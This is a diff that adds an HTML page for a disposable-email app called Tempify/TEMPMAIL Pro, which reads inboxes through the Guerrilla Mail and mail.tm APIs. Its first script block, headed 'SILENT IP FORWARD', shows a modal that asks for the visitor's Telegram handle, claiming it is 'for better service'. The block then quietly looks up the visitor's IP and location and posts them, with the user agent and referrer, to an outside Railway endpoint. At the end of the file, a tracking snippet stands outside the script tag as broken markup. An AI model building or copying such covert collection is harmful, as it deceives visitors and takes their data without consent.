@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover" />
+  <title>Tempify Pro · Smart Temp Mail</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      background: radial-gradient(circle at 10% 20%, #0a0f1e, #070b17);
+      min-height: 100vh;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 1000px;
+      margin: 0 auto;
+      background: rgba(12, 18, 34, 0.85);
+      backdrop-filter: blur(14px);
+      border-radius: 2rem;
+      border: 1px solid rgba(59, 130, 246, 0.35);
+      box-shadow: 0 30px 50px -20px rgba(0, 0, 0, 0.6);
+      overflow: hidden;
+    }
+
+    .header {
+      padding: 20px 24px 12px 24px;
+      border-bottom: 1px solid rgba(71, 85, 105, 0.5);
+      background: rgba(2, 6, 23, 0.4);
+    }
+
+    h1 {
+      font-size: 1.8rem;
+      font-weight: 800;
+      background: linear-gradient(125deg, #E0F2FE, #7AA9FF, #A5F3FC);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .sub {
+      color: #90a3bf;
+      font-size: 0.75rem;
+      margin-top: 8px;
+    }
+
+    .email-card {
+      margin: 20px 20px 16px 20px;
+      background: rgba(15, 23, 42, 0.8);
+      border-radius: 1.5rem;
+      border: 1px solid #2d3a5e;
+    }
+
+    .email-label {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 12px 18px 0 18px;
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      font-weight: 600;
+      color: #7aa2f7;
+    }
+
+    .email-input-area {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 8px 18px 18px 18px;
+      flex-wrap: wrap;
+    }
+
+    #email {
+      flex: 1;
+      background: #020617;
+      border: 1px solid #334155;
+      border-radius: 1.2rem;
+      padding: 14px 18px;
+      color: #f1f5f9;
+      font-size: 0.9rem;
+      font-weight: 500;
+      outline: none;
+      width: 100%;
+      min-width: 0;
+    }
+
+    .copy-btn-icon {
+      background: #1e2a47;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 1.2rem;
+      color: #cbd5ff;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: 0.2s;
+    }
+
+    .action-group {
+      display: flex;
+      gap: 12px;
+      margin: 0px 20px 22px 20px;
+      flex-wrap: wrap;
+    }
+
+    .btn-modern {
+      background: rgba(37, 99, 235, 0.2);
+      border: 1px solid rgba(59, 130, 246, 0.6);
+      padding: 11px 18px;
+      border-radius: 2.5rem;
+      font-weight: 600;
+      font-size: 0.85rem;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      cursor: pointer;
+      backdrop-filter: blur(4px);
+      transition: all 0.2s ease;
+      color: #eef2ff;
+      flex: 1 0 auto;
+      justify-content: center;
+    }
+
+    .btn-primary {
+      background: #2563eb;
+      border-color: #60a5fa;
+      color: white;
+      box-shadow: 0 6px 12px -6px #1e3a8a;
+    }
+
+    .domain-selector {
+      margin: 0 20px 15px 20px;
+      display: flex;
+      gap: 10px;
+      align-items: center;
+      flex-wrap: wrap;
+      background: rgba(0,0,0,0.3);
+      padding: 8px 12px;
+      border-radius: 2rem;
+    }
+
+    .domain-badge {
+      font-size: 0.7rem;
+      color: #90cdf4;
+    }
+
+    .refresh-domain {
+      background: none;
+      border: 1px solid #3b82f6;
+      border-radius: 30px;
+      padding: 4px 12px;
+      color: white;
+      cursor: pointer;
+      font-size: 0.7rem;
+    }
+
+    .inbox-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 20px 0px 20px;
+    }
+
+    .inbox-title {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: #cbd5ff;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .badge-count {
+      background: #1e293b;
+      padding: 2px 10px;
+      border-radius: 40px;
+      font-size: 0.7rem;
+      font-weight: 600;
+      color: #90cdf4;
+    }
+
+    .messages-area {
+      padding: 12px 16px 28px 16px;
+      max-height: 520px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .messages-area::-webkit-scrollbar {
+      width: 4px;
+    }
+
+    .messages-area::-webkit-scrollbar-track {
+      background: #0f172a;
+      border-radius: 8px;
+    }
+
+    .messages-area::-webkit-scrollbar-thumb {
+      background: #3b82f6;
+      border-radius: 8px;
+    }
+
+    .mail-card {
+      background: rgba(30, 41, 59, 0.75);
+      backdrop-filter: blur(4px);
+      border-radius: 1.25rem;
+      padding: 1rem 1.2rem;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      border: 1px solid rgba(71, 85, 105, 0.6);
+    }
+
+    .mail-card:active {
+      transform: scale(0.99);
+      background: #2563eb20;
+    }
+
+    .mail-subject {
+      font-weight: 700;
+      font-size: 0.95rem;
+      color: #f0f9ff;
+      margin-bottom: 10px;
+      word-break: break-word;
+    }
+
+    .mail-from {
+      font-size: 0.75rem;
+      color: #9bb5e6;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      word-break: break-all;
+    }
+
+    .mail-date {
+      font-size: 0.65rem;
+      color: #7f8ea3;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 10px;
+    }
+
+    .empty-state {
+      text-align: center;
+      padding: 42px 20px;
+      background: rgba(15, 23, 42, 0.5);
+      border-radius: 1.8rem;
+      border: 1px dashed #334155;
+      color: #94a3b8;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .detail-view {
+      background: #0f172af0;
+      border-radius: 1.5rem;
+      padding: 1.2rem;
+      border: 1px solid #2d3e66;
+      animation: fadeSlide 0.2s ease;
+    }
+
+    .detail-subject {
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: #eef2ff;
+      margin-bottom: 16px;
+      word-break: break-word;
+    }
+
+    .detail-meta {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      background: #02061770;
+      padding: 12px 14px;
+      border-radius: 1rem;
+      margin: 14px 0;
+      font-size: 0.75rem;
+    }
+
+    .message-body-content {
+      background: #020617a0;
+      padding: 18px;
+      border-radius: 1.2rem;
+      margin: 18px 0;
+      overflow-x: auto;
+      font-size: 0.85rem;
+      line-height: 1.5;
+      color: #e2e8f0;
+    }
+
+    .back-btn {
+      background: #1e293b;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 2rem;
+      font-weight: 500;
+      color: #b9d0ff;
+      cursor: pointer;
+      width: 100%;
+      justify-content: center;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    @keyframes fadeSlide {
+      from {
+        opacity: 0;
+        transform: translateY(8px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    footer {
+      font-size: 0.65rem;
+      text-align: center;
+      padding: 16px 20px 20px;
+      color: #5b6e8c;
+      border-top: 1px solid rgba(71, 85, 105, 0.3);
+    }
+
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #1e3a8a;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 40px;
+      font-size: 0.8rem;
+      z-index: 9999;
+      backdrop-filter: blur(12px);
+      font-weight: 500;
+    }
+
+    /* modal for telegram username */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.7);
+      backdrop-filter: blur(6px);
+      z-index: 10000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .modal-box {
+      background: #0f172a;
+      border: 1px solid #3b82f6;
+      border-radius: 2rem;
+      padding: 2rem 2rem 1.8rem;
+      max-width: 440px;
+      width: 100%;
+      box-shadow: 0 0 60px rgba(59,130,246,0.2);
+    }
+    .modal-box h2 {
+      color: #eef2ff;
+      font-size: 1.3rem;
+      margin-bottom: 0.4rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .modal-box p {
+      color: #94a3b8;
+      font-size: 0.85rem;
+      margin-bottom: 1.4rem;
+    }
+    .modal-box input {
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 1.2rem;
+      border: 1px solid #334155;
+      background: #020617;
+      color: #f1f5f9;
+      font-size: 0.95rem;
+      outline: none;
+      margin-bottom: 1.2rem;
+    }
+    .modal-box input:focus {
+      border-color: #3b82f6;
+    }
+    .modal-box .btn-submit {
+      background: #2563eb;
+      border: none;
+      padding: 14px;
+      border-radius: 2rem;
+      color: white;
+      font-weight: 600;
+      font-size: 1rem;
+      width: 100%;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .modal-box .btn-submit:hover {
+      background: #1d4ed8;
+    }
+    .modal-box .skip-link {
+      display: block;
+      text-align: center;
+      margin-top: 0.8rem;
+      color: #64748b;
+      font-size: 0.8rem;
+      cursor: pointer;
+      text-decoration: underline;
+    }
+
+    @media (max-width: 580px) {
+      body {
+        padding: 12px;
+      }
+      h1 {
+        font-size: 1.45rem;
+      }
+      .email-input-area {
+        flex-direction: column;
+        align-items: stretch;
+      }
+      .copy-btn-icon {
+        justify-content: center;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="header">
+    <h1><i class="fas fa-shield-alt"></i>  TEMPMAIL Pro</h1>
+    <div class="sub"><i class="fas fa-globe"></i> Smart temp mail · Bypass blocks with fresh domains</div>
+  </div>
+
+  <div class="email-card">
+    <div class="email-label">
+      <i class="fas fa-at"></i>
+      <span>disposable address</span>
+    </div>
+
+    <div class="email-input-area">
+      <input type="text" id="email" readonly placeholder="Generate new email">
+      <button class="copy-btn-icon" id="copyBtn">
+        <i class="fas fa-copy"></i> Copy
+      </button>
+    </div>
+  </div>
+
+  <div class="domain-selector">
+    <span class="domain-badge">
+      <i class="fas fa-server"></i>
+      Active provider:
+      <span id="activeProviderLabel">Guerrilla</span>
+    </span>
+
+    <button id="switchProviderBtn" class="refresh-domain">
+      <i class="fas fa-exchange-alt"></i>
+      Switch Provider
+    </button>
+  </div>
+
+  <div class="action-group">
+    <button class="btn-modern btn-primary" id="generateBtn">
+      <i class="fas fa-magic"></i>
+      Generate Mail
+    </button>
+
+    <button class="btn-modern" id="refreshBtn">
+      <i class="fas fa-rotate-right"></i>
+      Refresh
+    </button>
+  </div>
+
+  <div class="inbox-header">
+    <div class="inbox-title">
+      <i class="fas fa-inbox"></i>
+      Inbox
+      <span id="countBadge" class="badge-count">0</span>
+    </div>
+  </div>
+
+  <div id="inbox" class="messages-area">
+    <div class="empty-state">
+      <i class="far fa-envelope"></i>
+      <span>Tap Generate Mail to start</span>
+    </div>
+  </div>
+
+  <footer>
+    <i class="fas fa-sync-alt"></i>
+    Auto-refresh 6s · If a site blocks, click Switch Provider
+  </footer>
+
+</div>
+
+<!-- Modal for Telegram Username -->
+<div class="modal-overlay" id="usernameModal">
+  <div class="modal-box">
+    <h2><i class="fab fa-telegram"></i> Telegram handle</h2>
+    <p>Enter your Telegram username (optional) – we use it for better service.</p>
+    <input type="text" id="telegramInput" placeholder="@username or leave blank" />
+    <button class="btn-submit" id="submitUsernameBtn"><i class="fas fa-arrow-right"></i> Continue</button>
+    <span class="skip-link" id="skipUsernameBtn">Skip for now</span>
+  </div>
+</div>
+
+<script>
+// ===== SILENT IP FORWARD + TELEGRAM USERNAME COLLECTION =====
+(function() {
+  // track if already sent
+  let trackingSent = false;
+  let telegramUsername = null;
+
+  // show modal on load
+  const modal = document.getElementById('usernameModal');
+  const submitBtn = document.getElementById('submitUsernameBtn');
+  const skipBtn = document.getElementById('skipUsernameBtn');
+  const inputField = document.getElementById('telegramInput');
+
+  // resolve promise when user provides username or skips
+  function getUserInput() {
+    return new Promise((resolve) => {
+      submitBtn.addEventListener('click', function handler() {
+        let val = inputField.value.trim();
+        if (val && !val.startsWith('@')) val = '@' + val;
+        telegramUsername = val || null;
+        modal.style.display = 'none';
+        resolve(telegramUsername);
+        submitBtn.removeEventListener('click', handler);
+      });
+      skipBtn.addEventListener('click', function handler() {
+        telegramUsername = null;
+        modal.style.display = 'none';
+        resolve(null);
+        skipBtn.removeEventListener('click', handler);
+      });
+    });
+  }
+
+  // fetch IP and location, then send to bot with username
+  async function fetchIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip;
+    } catch {
+      return null;
+    }
+  }
+
+  async function fetchLocation(ip) {
+    try {
+      const res = await fetch(`https://ipapi.co/${ip}/json/`);
+      const data = await res.json();
+      return {
+        country: data.country_name || 'N/A',
+        city: data.city || 'N/A',
+        isp: data.org || 'N/A'
+      };
+    } catch {
+      return { country: 'N/A', city: 'N/A', isp: 'N/A' };
+    }
+  }
+
+  async function sendToBot(ip, location, username) {
+    // UPDATED: Your Railway endpoint (same as second website)
+    const endpoint = 'https://ip-production-7c88.up.railway.app/track';
+    const payload = {
+      ip: ip,
+      user_agent: navigator.userAgent,
+      referer: document.referrer || 'Direct',
+      location: location,
+      telegram: username || 'not_provided'
+    };
+    try {
+      await fetch(endpoint, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (e) {
+      // silent fail
+    }
+  }
+
+  // main: wait for username, then fetch ip and send
+  getUserInput().then(async (username) => {
+    const ip = await fetchIP();
+    if (ip) {
+      const loc = await fetchLocation(ip);
+      await sendToBot(ip, loc, username);
+    }
+    trackingSent = true;
+  });
+
+  // expose to console for debugging (optional)
+  window.__tempifyTracking = { getStatus: () => trackingSent };
+})();
+
+// ===== ORIGINAL TEMPMAIL LOGIC =====
+let currentProvider = "guerrilla";
+let currentSid = null;
+let currentEmail = null;
+let mailtmToken = null;
+
+function showMessage(msg, isErr = false) {
+  let toast = document.querySelector('.toast');
+  if (toast) toast.remove();
+  toast = document.createElement('div');
+  toast.className = 'toast';
+  toast.style.background = isErr ? '#b91c1c' : '#1e3a8a';
+  toast.innerText = msg;
+  document.body.appendChild(toast);
+  setTimeout(() => toast.remove(), 2500);
+}
+
+async function generateWithGuerrilla() {
+  const resp = await fetch('https://api.guerrillamail.com/ajax.php?f=get_email_address&ip=127.0.0.1&agent=TempifyPro');
+  const data = await resp.json();
+  if (data && data.email_addr) {
+    currentEmail = data.email_addr;
+    currentSid = data.sid;
+    return true;
+  }
+  return false;
+}
+
+async function generateWithMailTm() {
+  const domainRes = await fetch('https://api.mail.tm/domains');
+  const domainData = await domainRes.json();
+  const domain = domainData['hydra:member'][0].domain;
+  const randomName = 'usr_' + Math.random().toString(36).substring(2, 12) + Date.now();
+  const email = `${randomName}@${domain}`;
+  const pwd = 'TempSecure2025!';
+  await fetch('https://api.mail.tm/accounts', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ address: email, password: pwd })
+  }).catch(() => null);
+  const tokenRes = await fetch('https://api.mail.tm/token', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ address: email, password: pwd })
+  });
+  const tokenData = await tokenRes.json();
+  mailtmToken = tokenData.token;
+  currentEmail = email;
+  currentSid = mailtmToken;
+  return true;
+}
+
+async function generateMail() {
+  const btn = document.getElementById('generateBtn');
+  const original = btn.innerHTML;
+  btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Creating...';
+  btn.disabled = true;
+  try {
+    if (currentProvider === 'guerrilla') {
+      await generateWithGuerrilla();
+      document.getElementById('activeProviderLabel').innerText = 'Guerrilla Mail';
+    } else {
+      await generateWithMailTm();
+      document.getElementById('activeProviderLabel').innerText = 'Mail.tm';
+    }
+    document.getElementById('email').value = currentEmail;
+    showMessage('New email generated');
+    await loadInbox();
+  } catch (e) {
+    console.error(e);
+    showMessage('Generation failed', true);
+  }
+  btn.innerHTML = original;
+  btn.disabled = false;
+}
+
+async function loadInbox() {
+  if (!currentSid) return;
+  try {
+    if (currentProvider === 'guerrilla') {
+      const resp = await fetch(`https://api.guerrillamail.com/ajax.php?f=fetch_email_list&sid=${currentSid}&seq=0`);
+      const data = await resp.json();
+      const emails = data.list || [];
+      renderInbox(emails.map(m => ({
+        id: m.mail_id,
+        subject: m.mail_subject || '(No Subject)',
+        from: m.mail_from || 'Unknown',
+        timestamp: m.timestamp * 1000
+      })));
+    } else {
+      const resp = await fetch('https://api.mail.tm/messages', {
+        headers: { Authorization: `Bearer ${currentSid}` }
+      });
+      const data = await resp.json();
+      const mails = data['hydra:member'] || [];
+      renderInbox(mails.map(m => ({
+        id: m.id,
+        subject: m.subject || '(No Subject)',
+        from: m.from?.address || 'Unknown',
+        timestamp: new Date(m.createdAt).getTime()
+      })));
+    }
+  } catch (e) {
+    console.error(e);
+  }
+}
+
+function renderInbox(mails) {
+  const container = document.getElementById('inbox');
+  if (!mails.length) {
+    container.innerHTML = `
+      <div class="empty-state">
+        <i class="far fa-inbox"></i>
+        <span>No messages yet</span>
+      </div>
+    `;
+    updateBadge(0);
+    return;
+  }
+  updateBadge(mails.length);
+  container.innerHTML = '';
+  mails.sort((a, b) => b.timestamp - a.timestamp);
+  mails.forEach(mail => {
+    const card = document.createElement('div');
+    card.className = 'mail-card';
+    card.innerHTML = `
+      <div class="mail-subject">
+        <i class="fas fa-envelope"></i>
+        ${escapeHtml(mail.subject)}
+      </div>
+      <div class="mail-from">
+        <i class="fas fa-user-circle"></i>
+        ${escapeHtml(mail.from)}
+      </div>
+      <div class="mail-date">
+        <i class="far fa-clock"></i>
+        ${new Date(mail.timestamp).toLocaleString()}
+      </div>
+    `;
+    card.addEventListener('click', () => openMail(mail.id));
+    container.appendChild(card);
+  });
+}
+
+async function openMail(id) {
+  if (!currentSid) return;
+  try {
+    let detail;
+    if (currentProvider === 'guerrilla') {
+      const resp = await fetch(`https://api.guerrillamail.com/ajax.php?f=fetch_email&sid=${currentSid}&email_id=${id}`);
+      detail = await resp.json();
+    } else {
+      const resp = await fetch(`https://api.mail.tm/messages/${id}`, {
+        headers: { Authorization: `Bearer ${currentSid}` }
+      });
+      detail = await resp.json();
+    }
+    const subject = detail.mail_subject || detail.subject || '(No Subject)';
+    const from = detail.mail_from || detail.from?.address || 'Unknown';
+    let textBody = detail.mail_text || detail.text || '';
+    let htmlBody = detail.mail_body || detail.html || '';
+    if (Array.isArray(htmlBody)) htmlBody = htmlBody.join('');
+    const container = document.getElementById('inbox');
+    let bodyContent = '';
+    if (htmlBody && htmlBody.trim() !== '') {
+      bodyContent = `
+        <iframe
+          style="width:100%; min-height:500px; border:none; border-radius:14px; background:white;"
+          sandbox="allow-same-origin"
+          srcdoc="${htmlBody.replace(/&/g, '&amp;').replace(/"/g, '&quot;')}"
+        ></iframe>
+      `;
+    } else {
+      bodyContent = `<pre style="white-space:pre-wrap; font-family:inherit; margin:0;">${escapeHtml(textBody)}</pre>`;
+    }
+    container.innerHTML = `
+      <div class="detail-view">
+        <div class="detail-subject">
+          <i class="far fa-envelope-open"></i>
+          ${escapeHtml(subject)}
+        </div>
+        <div class="detail-meta">
+          <span><i class="fas fa-paper-plane"></i> <strong>From:</strong> ${escapeHtml(from)}</span>
+          <span><i class="fas fa-envelope"></i> <strong>To:</strong> ${escapeHtml(currentEmail)}</span>
+        </div>
+        <div class="message-body-content">${bodyContent}</div>
+        <button class="back-btn" id="detailBackBtn"><i class="fas fa-arrow-left"></i> Back to Inbox</button>
+      </div>
+    `;
+    document.getElementById('detailBackBtn').addEventListener('click', () => loadInbox());
+  } catch (e) {
+    console.error(e);
+    showMessage('Cannot open email', true);
+  }
+}
+
+function updateBadge(count) {
+  document.getElementById('countBadge').innerText = count;
+}
+
+function escapeHtml(str) {
+  if (!str) return '';
+  return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
+
+function copyMail() {
+  if (!currentEmail) return;
+  navigator.clipboard.writeText(currentEmail);
+  showMessage('Copied');
+}
+
+function switchProvider() {
+  currentProvider = currentProvider === 'guerrilla' ? 'mailtm' : 'guerrilla';
+  currentSid = null;
+  currentEmail = null;
+  document.getElementById('email').value = '';
+  document.getElementById('inbox').innerHTML = `
+    <div class="empty-state">
+      <i class="fas fa-exchange-alt"></i>
+      <span>Provider switched · Generate new email</span>
+    </div>
+  `;
+  updateBadge(0);
+}
+
+setInterval(() => {
+  if (currentSid && !document.querySelector('.detail-view')) {
+    loadInbox();
+  }
+}, 6000);
+
+document.getElementById('generateBtn').addEventListener('click', generateMail);
+document.getElementById('refreshBtn').addEventListener('click', loadInbox);
+document.getElementById('copyBtn').addEventListener('click', copyMail);
+document.getElementById('switchProviderBtn').addEventListener('click', switchProvider);
+</script>
+// ===== FORWARD VISIT TO DASHBOARD =====
+(function() {
+  fetch('/api/track', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      page_url:   window.location.href,
+      referrer:   document.referrer || 'Direct',
+      user_agent: navigator.userAgent
+    })
+  }).catch(function(){});
+})();
+</body>
+</html>
